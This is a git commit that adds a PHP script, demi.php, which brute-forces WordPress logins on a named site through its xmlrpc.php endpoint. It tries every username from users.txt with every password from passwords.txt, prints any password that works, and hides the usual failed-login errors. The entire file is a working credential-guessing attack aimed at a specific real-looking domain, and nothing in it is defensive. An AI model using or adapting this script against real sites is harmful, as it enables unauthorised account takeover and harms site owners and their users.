15e6637c21f7b1e3e4a4d6b4c80b547e82937096
aza <fake@email.com>
2015-02-13 16:45:50 -0300

    initial commit

---
+++ demi.php
@@ -0,0 +1,40 @@
+<?php
+
+require 'vendor/autoload.php';
+
+$domain = 'http://partidopirata.com.ar';
+$endpoint = $domain . "/xmlrpc.php";
+
+$users_file = 'users.txt';
+$passwords_file = 'passwords.txt';
+
+
+$users = file($users_file);
+$passwords = file($passwords_file);
+
+echo "Users file: $users_file\nPasswords file: $passwords_file\nTarget: $endpoint\n\n";
+
+function is_not_login_error($e) {
+  return strpos($e->getMessage(), 'Usuario') === false && strpos($e->getMessage(), 'incorrecta') === false;
+}
+
+foreach ( $users as $user ) {
+  foreach ( $passwords as $pass ) {
+    $pass = trim($pass);
+    $user = trim($user);
+
+    # Create client instance
+    $wpClient = new \HieuLe\WordpressXmlrpcClient\WordpressClient($endpoint, $user, $pass);
+
+    try {
+      $a = $wpClient->getProfile();
+
+      echo "El password es '$pass'\n";
+
+    } catch ( Exception $e ) {
+      if ( is_not_login_error($e) ) {
+        var_dump($e);
+      }
+    }
+  }
+}
